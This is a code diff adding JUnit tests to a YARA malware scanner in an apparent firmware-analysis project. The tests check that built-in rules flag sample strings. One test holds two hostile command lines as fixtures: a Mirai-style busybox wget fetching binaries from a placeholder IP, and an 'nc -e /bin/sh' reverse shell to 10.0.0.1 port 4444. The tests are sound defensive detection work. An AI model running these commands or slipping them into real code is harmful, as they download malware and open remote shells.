@@ -143,4 +143,39 @@ class YaraScannerTest {
         YaraScanner smallScanner = new YaraScanner(ruleset, smallLimit);
         assertThrows(DiagnosticException.class, () -> smallScanner.scan(buf, 0L, CancellationToken.none()));
     }
+
+    @Test
+    void matchesBuiltinThreatAndMalwareRules() throws Exception {
+        CompiledYaraRuleset ruleset = CompiledYaraRuleset.loadBuiltinRules(false, false, true);
+        assertTrue(ruleset.ruleCount() >= 4);
+
+        YaraScanner scanner = new YaraScanner(ruleset);
+
+        // Test Mirai commands pattern
+        byte[] miraiData = ("noise /bin/busybox wget http://1.2.3.4/bins PONG and more noise")
+                .getBytes(StandardCharsets.ISO_8859_1);
+        List<YaraMatch> matches = scanner.scan(miraiData, 0x5000L, CancellationToken.none());
+        assertFalse(matches.isEmpty());
+        assertEquals("Mirai_Botnet_Commands", matches.get(0).ruleName());
+        assertEquals("MALWARE", matches.get(0).category());
+
+        // Test Reverse shell backdoor
+        byte[] backdoorData = "exec nc -e /bin/sh 10.0.0.1 4444".getBytes(StandardCharsets.ISO_8859_1);
+        List<YaraMatch> bdMatches = scanner.scan(backdoorData, 0x6000L, CancellationToken.none());
+        assertFalse(bdMatches.isEmpty());
+        assertEquals("Reverse_Shell_Payload", bdMatches.get(0).ruleName());
+        assertEquals("BACKDOOR", bdMatches.get(0).category());
+    }
+
+    @Test
+    void initializesCryptoTableDatabaseAndPipelineWithYara() {
+        CompiledYaraRuleset ruleset = CompiledYaraRuleset.loadBuiltinRules(true, false);
+        CryptoTableDatabase db = CryptoTableDatabase.withYara(ruleset);
+        assertNotNull(db);
+        assertTrue(db.signatures().size() > 10);
+
+        io.github.rezabakhshi.embedra.analyzers.crypto.fusion.CryptoAnalysisPipeline pipeline =
+                io.github.rezabakhshi.embedra.analyzers.crypto.fusion.CryptoAnalysisPipeline.withYara(ruleset);
+        assertNotNull(pipeline);
+    }
 }
